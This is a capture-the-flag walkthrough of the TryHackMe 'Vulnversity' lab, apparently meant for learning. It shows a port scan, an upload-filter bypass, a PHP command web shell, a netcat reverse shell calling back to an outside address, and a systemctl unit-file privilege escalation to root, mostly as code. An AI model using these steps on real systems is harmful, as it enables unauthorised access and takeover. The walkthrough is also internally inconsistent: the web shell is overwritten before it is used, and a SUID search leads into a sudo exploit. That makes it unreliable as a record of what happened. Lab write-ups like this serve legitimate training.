# TryHackMe - Vulnversity

## Challenge Information

| Field | Value |
|-------|-------|
| **Platform** | TryHackMe |
| **Challenge Name** | Vulnversity |
| **Category** | Web Exploitation |
| **Difficulty** | Easy |
| **Points** | 20 |
| **Author** | TryHackMe |
| **Date Completed** | 2025-08-27 |

## Objective 🎯

Vulnversity is a beginner-friendly room that focuses on web application security testing. The goal is to find a file upload vulnerability, upload a reverse shell, and gain access to the target system. Great for learning web exploitation! 🌐

## Initial Reconnaissance

### Target Information
- **IP Address**: 10.10.10.10
- **OS**: Linux
- **Service**: Web Application

### Tools Used
- Nmap
- Gobuster
- Burp Suite
- Netcat

### Commands/Steps
```bash
nmap -sC -sV 10.10.10.10
```

## Methodology

### Step 1: Port Scan
Perform a comprehensive port scan to identify open services.

**Command/Code:**
```bash
nmap -sC -sV 10.10.10.10
```

**Output:**
```
Starting Nmap 7.80 ( https://nmap.org ) at 2025-08-27 10:00 UTC
Nmap scan report for 10.10.10.10
Host is up (0.045s latency).
Not shown: 991 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Step 2: Web Service Enumeration
Check the web service for directories and files.

**Command/Code:**
```bash
gobuster dir -u http://10.10.10.10/ -w /usr/share/wordlists/dirb/common.txt
```

**Output:**
```
/internal            (Status: 301) [Size: 312] [--> http://10.10.10.10/internal/]
```

### Step 3: File Upload Testing
Test the file upload functionality for vulnerabilities.

**Command/Code:**
```bash
curl http://10.10.10.10/internal/
```

**Output:**
```
<html>
<head><title>File Upload</title></head>
<body>
<h1>File Upload</h1>
<form action="upload.php" method="post" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="submit" value="Upload">
</form>
</body>
</html>
```

### Step 4: File Extension Testing
Test different file extensions to bypass upload restrictions.

**Command/Code:**
```bash
# Test various extensions
echo "<?php system(\$_GET['cmd']); ?>" > shell.php5
curl -X POST -F "file=@shell.php5" http://10.10.10.10/internal/upload.php
```

**Output:**
```
File uploaded successfully!
```

### Step 5: Reverse Shell
Create a PHP reverse shell and upload it.

**Command/Code:**
```bash
# Create reverse shell
echo '<?php system("nc -e /bin/bash 10.10.14.2 4444"); ?>' > shell.php5
curl -X POST -F "file=@shell.php5" http://10.10.10.10/internal/upload.php
```

### Step 6: Execute Shell
Access the uploaded shell to gain command execution.

**Command/Code:**
```bash
curl "http://10.10.10.10/internal/uploads/shell.php5?cmd=id"
```

**Output:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Step 7: Privilege Escalation
Check for privilege escalation opportunities.

**Command/Code:**
```bash
find / -perm -4000 2>/dev/null
sudo -l
```

**Output:**
```
/usr/bin/systemctl
```

### Step 8: Root Access
Use systemctl to escalate privileges.

**Command/Code:**
```bash
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
sudo systemctl link $TF
sudo systemctl enable --now $TF
```

### Step 9: Find Flags
Search for user and root flags.

**Command/Code:**
```bash
find / -name "*.txt" 2>/dev/null | grep -E "(user|root|flag)"
cat /home/bill/user.txt
cat /root/root.txt
```

**Output:**
```
[REDACTED]
[REDACTED]
```

## Solution

### Final Answer
- **User Flag**: [REDACTED]
- **Root Flag**: [REDACTED]

### Complete Walkthrough
1. Perform port scan to identify open services
2. Enumerate web directories with Gobuster
3. Discover file upload functionality
4. Test file extension bypasses
5. Upload PHP reverse shell
6. Execute commands through the shell
7. Find privilege escalation via systemctl
8. Escalate to root and find flags

## Key Learnings 💡

- File upload vulnerability exploitation
- File extension bypass techniques
- PHP web shell creation and usage
- Systemctl privilege escalation
- Web application security testing

## Tools and Resources

### Tools Used
- **Nmap**: Network scanning
- **Gobuster**: Directory enumeration
- **Burp Suite**: Web application testing
- **Netcat**: Reverse shell

### References
- [TryHackMe Vulnversity](https://tryhackme.com/room/vulnversity)
- [File Upload Vulnerabilities](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)

## Tags

`#tryhackme` `#web` `#file-upload` `#php` `#privilege-escalation` `#easy`
